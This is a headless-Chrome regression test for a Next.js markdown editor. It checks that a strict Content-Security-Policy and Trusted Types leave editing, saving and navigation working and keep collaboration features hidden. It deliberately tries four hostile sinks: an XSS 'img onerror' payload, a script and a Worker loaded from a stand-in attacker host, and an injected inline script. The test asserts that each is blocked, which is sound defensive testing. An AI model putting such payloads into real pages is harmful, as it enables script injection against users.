import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { readFileSync, readdirSync, mkdirSync, mkdtempSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer, request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";

import { instrumentPolicyHtml, normalProductionPolicy, normalProductionTrustedTypesSource } from "./lib/collaboration-hc3-slice5-policy.mjs";
import {
  CdpClient,
  createPage,
  createProjectPickerShim,
  evaluate,
  findChromeExecutable,
  inventoryProject,
  startFixtureFileServer,
  waitForDevToolsUrl,
  waitForEditorShell,
  waitForProcessExit
} from "./comment-rail-editor-browser-regression.test.mjs";

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const upstreamPort = 3130;
const policyPort = 3131;
const policyOrigin = `http://127.0.0.1:${policyPort}`;
const activationUrl = `${policyOrigin}/?collaboration=development_shadow&hc3=enabled&human_collaboration=released&agent_exchange=released#human_collaboration=true&agent_exchange=true`;
const chromePath = process.env.PATCHMARK_CHROME_PATH ?? findChromeExecutable();
if (!chromePath) throw new Error("Chrome was not found for the Slice 5 production-policy qualification.");

const buildIsolation = scanProductionBuild();
const fixtureRoot = mkdtempSync(join(tmpdir(), "patchmark-hc3-slice5-production-policy-"));
const firstProject = join(fixtureRoot, "first-project");
const secondProject = join(fixtureRoot, "second-project");
createProjectFixture(firstProject, {
  projectId: "prj_hc3_slice5_policy_one",
  title: "HC3 Production Policy One",
  documents: [
    ["doc_policy_one", "Policy One", "policy-one.md", "# Policy One\n\nBookmark target sentence for strict production policy.\n"],
    ["doc_policy_two", "Policy Two", "policy-two.md", "# Policy Two\n\nDocument switching remains single-user.\n"]
  ]
});
createProjectFixture(secondProject, {
  projectId: "prj_hc3_slice5_policy_other",
  title: "HC3 Production Policy Other",
  documents: [["doc_policy_other", "Other Project", "other.md", "---\nhuman_collaboration: true\nagent_exchange: true\n---\n\n# Other Project\n\nProject isolation under policy.\n"]]
});
const fixtureInventory = inventoryProject(fixtureRoot);
const fixtureServer = await startFixtureFileServer(fixtureRoot, fixtureInventory);
const next = spawn(process.execPath, ["node_modules/next/dist/bin/next", "start", "--hostname", "127.0.0.1", "--port", `${upstreamPort}`], {
  cwd: repositoryRoot,
  env: { ...process.env, NODE_ENV: "production", NEXT_PUBLIC_PATCHMARK_COLLABORATION_SHADOW: "development_shadow" },
  stdio: ["ignore", "ignore", "pipe"]
});
let proxy;
let chrome;
let client;
let profile;
let assertions = 0;
const check = (value, message) => { assertions += 1; assert.ok(value, message); };
const equal = (actual, expected, message) => { assertions += 1; assert.deepEqual(actual, expected, message); };

try {
  await waitForHttp(`http://127.0.0.1:${upstreamPort}/`);
  proxy = await startPolicyProxy(fixtureServer.baseUrl);
  await waitForHttp(`${policyOrigin}/`);
  profile = mkdtempSync(join(tmpdir(), "patchmark-hc3-slice5-production-policy-chrome-"));
  chrome = spawn(chromePath, [
    "--headless=new", "--remote-debugging-port=0", `--user-data-dir=${profile}`,
    "--no-first-run", "--no-default-browser-check", "--disable-background-networking",
    "--disable-component-update", "--disable-default-apps", "--disable-extensions",
    "--disable-sync", "--disable-features=Translate,MediaRouter", "about:blank"
  ], { stdio: ["ignore", "ignore", "pipe"] });
  const browserUrl = await waitForDevToolsUrl(chrome);
  const pageUrl = await createPage(browserUrl, "about:blank");
  client = await CdpClient.connect(pageUrl);
  await client.call("Page.enable");
  await client.call("Runtime.enable");
  await client.call("Page.addScriptToEvaluateOnNewDocument", {
    source: `${createProjectPickerShim({
      baseUrl: `${policyOrigin}/__fixture__`,
      directories: fixtureInventory.directories,
      files: fixtureInventory.files,
      pickerPaths: ["first-project", "second-project"],
      projectName: "hc3-slice5-production-policy"
    })}\n${productionActivityInstrumentation()}`
  });
  await client.call("Page.addScriptToEvaluateOnNewDocument", {
    source: `localStorage.setItem('patchmark-collaboration', 'development_shadow'); localStorage.setItem('human_collaboration', 'released'); localStorage.setItem('agent_exchange', 'released'); sessionStorage.setItem('human_collaboration', 'released'); sessionStorage.setItem('agent_exchange', 'released'); document.cookie = 'patchmark-collaboration=development_shadow; SameSite=Strict'; document.cookie = 'human_collaboration=released; SameSite=Strict'; document.cookie = 'agent_exchange=released; SameSite=Strict'; window.name = 'human_collaboration=released&agent_exchange=released';`
  });
  await client.call("Page.navigate", { url: activationUrl });
  await waitForEditorShell(client);

  const hostile = await hostileSinkEvidence();
  equal([hostile.blocked, hostile.side_effects], [4, 0], "normal production blocks hostile HTML, script URL, worker URL, and inline-script sinks");
  check(hostile.policy_events >= 3, `normal production emitted enforced policy events for deliberate hostile sinks (${hostile.policy_events})`);

  await clickButton("File");
  await clickButton("Open Project Folder");
  await waitFor("first project", `document.querySelector('.application-breadcrumb-project')?.textContent?.includes('HC3 Production Policy One')`);
  await waitFor("two documents", `document.querySelectorAll('.project-document-item').length === 2`);
  equal(await valueOf("document.querySelector('.application-bar')?.getBoundingClientRect().height"), 48, "normal production retains the compact 48 px application bar");

  await clickButton("Markdown Mode");
  await waitFor("Markdown mode", `Boolean(document.querySelector('.markdown-source-editor'))`);
  await evaluate(client, { expression: `(() => {
    const textarea = document.querySelector('.markdown-source-editor');
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set;
    setter.call(textarea, textarea.value + '\\nSaved under strict production policy.\\n');
    textarea.dispatchEvent(new Event('input', { bubbles: true }));
    return true;
  })()`, userGesture: true });
  await waitFor("dirty save state", `Boolean(document.querySelector('.document-status-dirty'))`);
  await clickButton("Save Changes");
  await waitFor("saved state", `Boolean(document.querySelector('.document-status-saved'))`);
  await clickButton("Visual Mode");
  await waitFor("Visual mode", `Boolean(document.querySelector('.visual-editor-shell, .patchmark-mdx-editor'))`);

  await clickDocument("Policy Two");
  await waitFor("document switch", `document.querySelector('.application-breadcrumb-document')?.textContent?.includes('Policy Two')`);
  await clickDocument("Policy One");
  await waitFor("document switch back", `document.querySelector('.application-breadcrumb-document')?.textContent?.includes('Policy One')`);
  await clickButton("Markdown Mode");
  await waitFor("Markdown mode for bookmark", `Boolean(document.querySelector('.markdown-source-editor'))`);
  await createReadingBookmark("Bookmark target sentence for strict production policy.");
  await waitFor("reading bookmark", `Boolean(Array.from(document.querySelectorAll('button')).find((button) => button.textContent?.trim() === 'Continue reading'))`);

  await clickButton("File");
  const fileMenu = await menuLabels();
  check(fileMenu.includes("Save Changes") && fileMenu.includes("Open Project Folder"), "normal production File menu remains operable under policy");
  await clickButton("File");
  await clickButton("Review");
  const reviewMenu = await menuLabels();
  check(reviewMenu.includes("Review patch proposals") && reviewMenu.includes("Guided Review"), "normal production Review menu remains operable under policy");
  await clickButton("Review");
  await evaluate(client, { expression: `(() => { const button = document.querySelector('.application-comments-trigger'); if (!button || button.disabled) throw new Error('Comments trigger unavailable.'); button.click(); return true; })()`, userGesture: true });
  await waitFor("comments panel", `Boolean(document.querySelector('[aria-label="Document comments"]'))`);
  await evaluate(client, { expression: `(() => { const button = document.querySelector('button[aria-label="Collapse comments"], button[aria-label="Close comments"]'); if (!button) throw new Error('Comments close button missing.'); button.click(); return true; })()`, userGesture: true });
  await waitFor("comments close", `document.querySelector('[aria-label="Document comments"]')?.hidden === true`);

  await clickButton("File");
  await clickButton("Open Project Folder");
  await waitFor("project switch", `document.querySelector('.application-breadcrumb-project')?.textContent?.includes('HC3 Production Policy Other')`);
  const beforeReload = await valueOf("({ policy_events: structuredClone(window.__patchmarkHc3Slice5PolicyEvents ?? []), runtime_events: structuredClone(window.__patchmarkHc3Slice5RuntimeEvents ?? []), console_events: structuredClone(window.__patchmarkHc3Slice5ConsoleEvents ?? []), trusted_type_policies: [...(window.__patchmarkHc3Slice5TrustedTypePolicies ?? [])] })");
  await client.call("Page.reload", { ignoreCache: true });
  await waitForEditorShell(client);
  check(await valueOf("Boolean(document.querySelector('.application-bar'))"), "normal production reload hydrates under strict CSP and Trusted Types");

  const evidence = await evaluate(client, { expression: `(() => ({
    policy_events: structuredClone(window.__patchmarkHc3Slice5PolicyEvents ?? []),
    runtime_events: structuredClone(window.__patchmarkHc3Slice5RuntimeEvents ?? []),
    console_events: structuredClone(window.__patchmarkHc3Slice5ConsoleEvents ?? []),
    trusted_type_policies: [...(window.__patchmarkHc3Slice5TrustedTypePolicies ?? [])],
    collaboration_dom: document.querySelectorAll('[data-testid*="collaboration"], [class*="collaboration"]').length,
    collaboration_text: document.body.innerText.includes('Collaboration…'),
    agent_exchange_dom: document.querySelectorAll('[data-testid*="agent-exchange"], [class*="agent-exchange"]').length,
    agent_exchange_text: /Agent Exchange/i.test(document.body.innerText),
    authority_runtime: Boolean(window.__patchmarkHc3ProductAuthorityRuntime),
    activity: structuredClone(window.__patchmarkProductionActivity ?? {}),
    resources: performance.getEntriesByType('resource').map((entry) => entry.name),
    webpack_scripts: Array.from(document.scripts).filter((script) => script.src.includes('/webpack-')).map((script) => ({ nonce: script.nonce, src_path: new URL(script.src).pathname }))
  }))()` });
  const policyEvents = [...beforeReload.policy_events, ...evidence.policy_events];
  const runtimeEvents = [...beforeReload.runtime_events, ...evidence.runtime_events];
  const consoleEvents = [...beforeReload.console_events, ...evidence.console_events];
  equal(policyEvents, [], `normal production behavior produces no unexpected CSP or Trusted Types violation (${JSON.stringify(evidence.webpack_scripts)})`);
  equal(runtimeEvents, [], "normal production behavior produces no unhandled runtime error");
  const trustedTypePolicies = [...new Set([...beforeReload.trusted_type_policies, ...evidence.trusted_type_policies])];
  equal(trustedTypePolicies, ["default", "nextjs#bundler"], "normal production creates only the exact Radix-style and Next production-bundler policies");
  equal([evidence.collaboration_dom, evidence.collaboration_text, evidence.authority_runtime], [0, false, false], "collaboration remains invisible, unreachable, and unassembled");
  equal([evidence.agent_exchange_dom, evidence.agent_exchange_text], [0, false], "agent exchange remains invisible, unreachable, and unassembled");
  equal([evidence.activity.rtc, evidence.activity.camera, evidence.activity.worker], [0, 0, 0], "normal production performs no WebRTC, camera, or worker capability activity");
  check((evidence.activity.databases ?? []).every((name) => !/collaboration|hc[123]|patchmark-replica/i.test(name)), "normal production opens no collaboration custody or replica database");
  check(evidence.resources.every((entry) => [policyOrigin, "data:", "blob:"].some((prefix) => entry.startsWith(prefix))), "normal production loads no remote script, font, image, worker, or connection resource");
  check(!/pmhc3\.|private|recovery|secret|\/Users\//i.test(JSON.stringify([policyEvents, runtimeEvents, consoleEvents])), "normal production diagnostics contain no artifact, key, recovery, path, or project material");
  check(buildIsolation.marker_hits.length === 0 && buildIsolation.authority_hits.length === 0, "optimized harness and test authority markers are absent from every production build output");
  check(buildIsolation.initial_collaboration_hits.length === 0, "the initial production page graph contains no HC-3 carrier or collaboration authority marker");
  check(!evidence.resources.some((entry) => /collaboration|agent-exchange|optimized-harness|product-authority-runtime|qr-provider/i.test(entry)), "normal production loads no disabled-feature lazy chunk or harness asset");
  const version = await client.call("Browser.getVersion");
  process.stdout.write(`${JSON.stringify({
    assertions,
    chrome: version.product,
    server_mode: "next start",
    production_build: true,
    policy: normalProductionPolicy("patchmark-hc3-slice5-production").header,
    trusted_type_policy_inventory: trustedTypePolicies,
    hostile_sink_errors: hostile.error_names,
    hydration: "pass",
    editor: { visual: true, markdown: true, save: true, document_switch: true, project_switch: true, bookmark: true, comments: true, menus: true, compact_bar: 48, reload: true },
    collaboration_visible: false,
    collaboration_activity: false,
    agent_exchange_visible: false,
    agent_exchange_activity: false,
    activation_vectors_rejected: ["query", "fragment", "cookie", "local_storage", "session_storage", "window_name", "public_environment", "imported_project_frontmatter"],
    production_graph_files_scanned: buildIsolation.files_scanned,
    harness_marker_hits: buildIsolation.marker_hits,
    authority_marker_hits: buildIsolation.authority_hits,
    initial_collaboration_hits: buildIsolation.initial_collaboration_hits,
    csp_violations: policyEvents.length,
    status: "ok"
  }, null, 2)}\n`);
} finally {
  await client?.close().catch(() => undefined);
  chrome?.kill("SIGTERM");
  next.kill("SIGTERM");
  await waitForProcessExit(chrome, 1_000).catch(() => chrome?.kill("SIGKILL"));
  await waitForProcessExit(next, 2_000).catch(() => next.kill("SIGKILL"));
  await proxy?.close().catch(() => undefined);
  await fixtureServer.close();
  if (profile) rmSync(profile, { recursive: true, force: true });
  rmSync(fixtureRoot, { recursive: true, force: true });
}

async function startPolicyProxy(fixtureBaseUrl) {
  const nonce = "patchmark-hc3-slice5-production";
  const policy = normalProductionPolicy(nonce);
  const fixture = new URL(fixtureBaseUrl);
  const server = createServer((request, response) => {
    const pathname = new URL(request.url ?? "/", policyOrigin).pathname;
    const isFixture = pathname.startsWith("/__fixture__/");
    const upstreamPath = isFixture ? `${pathname.slice("/__fixture__".length)}${new URL(request.url ?? "/", policyOrigin).search}` : request.url;
    const upstream = httpRequest({
      hostname: isFixture ? fixture.hostname : "127.0.0.1",
      port: isFixture ? fixture.port : upstreamPort,
      path: upstreamPath,
      method: request.method,
      headers: { ...request.headers, host: isFixture ? fixture.host : `127.0.0.1:${upstreamPort}`, "accept-encoding": "identity" }
    }, (incoming) => {
      const contentType = `${incoming.headers["content-type"] ?? ""}`;
      if (isFixture || !contentType.includes("text/html")) {
        response.writeHead(incoming.statusCode ?? 502, incoming.headers);
        incoming.pipe(response);
        return;
      }
      const chunks = [];
      incoming.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
      incoming.on("end", () => {
        const headers = { ...incoming.headers };
        delete headers["content-length"];
        delete headers["content-encoding"];
        headers["cache-control"] = "no-store";
        headers["content-security-policy"] = policy.header;
        headers["referrer-policy"] = "no-referrer";
        headers["x-content-type-options"] = "nosniff";
        response.writeHead(incoming.statusCode ?? 502, headers);
        response.end(instrumentPolicyHtml(Buffer.concat(chunks).toString("utf8"), nonce, normalProductionTrustedTypesSource()));
      });
    });
    upstream.on("error", (error) => { if (!response.headersSent) response.writeHead(502); response.end(String(error)); });
    request.pipe(upstream);
  });
  await new Promise((resolveListen, rejectListen) => { server.once("error", rejectListen); server.listen(policyPort, "127.0.0.1", resolveListen); });
  return { close: () => new Promise((resolveClose, rejectClose) => { server.closeAllConnections?.(); server.close((error) => error ? rejectClose(error) : resolveClose()); }) };
}

function productionActivityInstrumentation() {
  return `(() => {
    const activity = { camera: 0, databases: [], rtc: 0, worker: 0 };
    Object.defineProperty(window, '__patchmarkProductionActivity', { value: activity, configurable: false });
    if (globalThis.RTCPeerConnection) globalThis.RTCPeerConnection = new Proxy(globalThis.RTCPeerConnection, { construct(target, args, receiver) { activity.rtc += 1; return Reflect.construct(target, args, receiver); } });
    if (globalThis.Worker) globalThis.Worker = new Proxy(globalThis.Worker, { construct(target, args, receiver) { activity.worker += 1; return Reflect.construct(target, args, receiver); } });
    if (navigator.mediaDevices?.getUserMedia) { const original = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices); navigator.mediaDevices.getUserMedia = (...args) => { activity.camera += 1; return original(...args); }; }
    if (globalThis.indexedDB?.open) { const original = globalThis.indexedDB.open.bind(globalThis.indexedDB); globalThis.indexedDB.open = (name, ...args) => { activity.databases.push(String(name)); return original(name, ...args); }; }
  })();`;
}

async function hostileSinkEvidence() {
  const result = await evaluate(client, { expression: `(() => {
    const probe = document.createElement('div'); const external = document.createElement('script'); const inline = document.createElement('script');
    const attempts = [
      () => { probe.innerHTML = '<img src=x onerror=globalThis.__hc3SinkExecuted=1>'; },
      () => { external.src = 'https://attacker.invalid/hostile.js'; },
      () => { new Worker('https://attacker.invalid/hostile.js'); },
      () => { inline.textContent = 'globalThis.__hc3SinkExecuted=1'; document.head.append(inline); }
    ];
    globalThis.__hc3SinkExecuted = 0; const errorNames = []; let blocked = 0;
    for (const attempt of attempts) { try { attempt(); } catch (error) { blocked += 1; errorNames.push(error?.name ?? 'Error'); } }
    const evidence = { blocked, error_names: errorNames, side_effects: Number(globalThis.__hc3SinkExecuted) }; delete globalThis.__hc3SinkExecuted; return evidence;
  })()` });
  await delay(50);
  const policyEvents = await valueOf("window.__patchmarkHc3Slice5PolicyEvents.length");
  await evaluate(client, { expression: "window.__patchmarkHc3Slice5PolicyEvents.splice(0)" });
  await evaluate(client, { expression: "Object.assign(window.__patchmarkProductionActivity, { camera: 0, rtc: 0, worker: 0 })" });
  return { ...result, policy_events: policyEvents };
}

async function clickButton(text) {
  await waitFor(`button ${text}`, `Array.from(document.querySelectorAll('button')).some((button) => button.textContent?.trim() === ${JSON.stringify(text)} && !button.disabled)`);
  await evaluate(client, { expression: `(() => { const matches = Array.from(document.querySelectorAll('button')).filter((button) => button.textContent?.trim() === ${JSON.stringify(text)} && !button.disabled); (matches.find((button) => !button.closest('nav')) ?? matches[0]).click(); return true; })()`, userGesture: true });
}

async function clickDocument(title) {
  await evaluate(client, { expression: `(() => { const button = Array.from(document.querySelectorAll('.project-document-select')).find((candidate) => candidate.textContent?.includes(${JSON.stringify(title)})); if (!button) throw new Error('Document button missing.'); button.click(); return true; })()`, userGesture: true });
}

async function createReadingBookmark(target) {
  await evaluate(client, { expression: `(() => { const textarea = document.querySelector('.markdown-source-editor'); const start = textarea.value.indexOf(${JSON.stringify(target)}); if (start < 0) throw new Error('Bookmark target missing.'); textarea.focus(); textarea.setSelectionRange(start, start + ${target.length}); textarea.dispatchEvent(new Event('select', { bubbles: true })); textarea.dispatchEvent(new MouseEvent('mouseup', { bubbles: true })); textarea.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: 720, clientY: 520 })); return true; })()`, userGesture: true });
  await waitFor("selection action chooser", `Boolean(document.querySelector('[data-testid="selection-actions-chooser"]'))`);
  await evaluate(client, { expression: `(() => { const button = document.querySelector('[data-selection-action-option="bookmark"]'); if (!button || button.disabled) throw new Error('Bookmark action unavailable.'); button.click(); return true; })()`, userGesture: true });
}

async function menuLabels() {
  await waitFor("open menu", `Boolean(document.querySelector('[role="menu"]:not([hidden])'))`);
  return valueOf("Array.from(document.querySelectorAll('[role=menuitem]')).filter((item) => item.getClientRects().length).map((item) => item.textContent?.trim())");
}

async function valueOf(expression) { return evaluate(client, { expression }); }
async function waitFor(label, expression) {
  for (let attempt = 0; attempt < 400; attempt += 1) { if (await valueOf(`Boolean(${expression})`)) return; await delay(50); }
  const diagnostic = await valueOf("({ body: document.body.innerText.slice(0, 2000), policy: window.__patchmarkHc3Slice5PolicyEvents ?? [], runtime: window.__patchmarkHc3Slice5RuntimeEvents ?? [], activity: window.__patchmarkProductionActivity ?? {} })");
  throw new Error(`Timed out waiting for ${label}: ${JSON.stringify(diagnostic)}`);
}
async function waitForHttp(url) { for (let attempt = 0; attempt < 300; attempt += 1) { try { if ((await fetch(url)).ok) return; } catch {} await delay(100); } throw new Error(`Server did not become ready: ${url}. Run npm run build first.`); }

function scanProductionBuild() {
  const buildRoot = join(repositoryRoot, ".next");
  if (!statSync(buildRoot).isDirectory()) throw new Error("Production build output is missing. Run npm run build first.");
  const files = walk(buildRoot).filter((file) => !file.slice(buildRoot.length + 1).startsWith(`cache${process.platform === "win32" ? "\\" : "/"}`));
  const markerHits = [];
  const authorityHits = [];
  for (const file of files) {
    const bytes = readFileSync(file);
    if (bytes.includes(Buffer.from("PATCHMARK_HC3_SLICE5_OPTIMIZED_HARNESS_V1")) || bytes.includes(Buffer.from("collaboration-hc3-slice5-optimized-entry"))) markerHits.push(file.slice(buildRoot.length + 1));
    if (bytes.includes(Buffer.from("createSlice4RealProductAuthorityRuntime")) || bytes.includes(Buffer.from("collaboration-hc3-slice4-product-authority-runtime"))) authorityHits.push(file.slice(buildRoot.length + 1));
  }
  const manifest = JSON.parse(readFileSync(join(buildRoot, "build-manifest.json"), "utf8"));
  const initialHits = [];
  for (const relativePath of [...new Set(Object.values(manifest.pages ?? {}).flat())]) {
    const path = join(buildRoot, relativePath);
    if (!relativePath.endsWith(".js") || !statSync(path).isFile()) continue;
    const source = readFileSync(path, "utf8");
    if (/pmhc3|connection-offer-commitment|patchmarkHc3ProductAuthorityRuntime|collaboration-qualification-workspace/.test(source)) initialHits.push(relativePath);
  }
  return Object.freeze({ files_scanned: files.length, marker_hits: markerHits, authority_hits: authorityHits, initial_collaboration_hits: initialHits });
}

function walk(directory) {
  const files = [];
  for (const entry of readdirSync(directory, { withFileTypes: true })) {
    const path = join(directory, entry.name);
    if (entry.isDirectory()) files.push(...walk(path)); else files.push(path);
  }
  return files;
}

function createProjectFixture(root, input) {
  const metadata = join(root, ".patchmark");
  const now = "2026-08-27T00:00:00.000Z";
  mkdirSync(join(metadata, "documents"), { recursive: true });
  const documents = input.documents.map(([documentId, displayTitle, path, markdown], index) => {
    writeFileSync(join(root, path), markdown);
    const store = join(metadata, "documents", documentId);
    for (const directory of ["versions", "context-packs", "imports", "recovery"]) mkdirSync(join(store, directory), { recursive: true });
    writeFileSync(join(store, "manifest.json"), `${JSON.stringify({ schema_version: 1, project_id: input.projectId, document_id: documentId, project_name: input.title, document_file: "document.md", created_at: now, updated_at: now }, null, 2)}\n`);
    writeFileSync(join(store, "comments.json"), "[]\n"); writeFileSync(join(store, "patches.json"), "[]\n"); writeFileSync(join(store, "tasks.json"), "[]\n");
    writeFileSync(join(store, "document.json"), `${JSON.stringify({ format: "patchmark-document-store", schema_version: 1, document_id: documentId, created_at: now, source: "created" }, null, 2)}\n`);
    return { document_id: documentId, path, display_title: displayTitle, group_id: null, role: "research", status: "active", position: (index + 1) * 1000, added_at: now, archived_at: null };
  });
  writeFileSync(join(metadata, "project.json"), `${JSON.stringify({ format: "patchmark-project", schema_version: 2, project_id: input.projectId, title: input.title, created_at: now, manifest_revision: 1, groups: [], documents }, null, 2)}\n`);
}
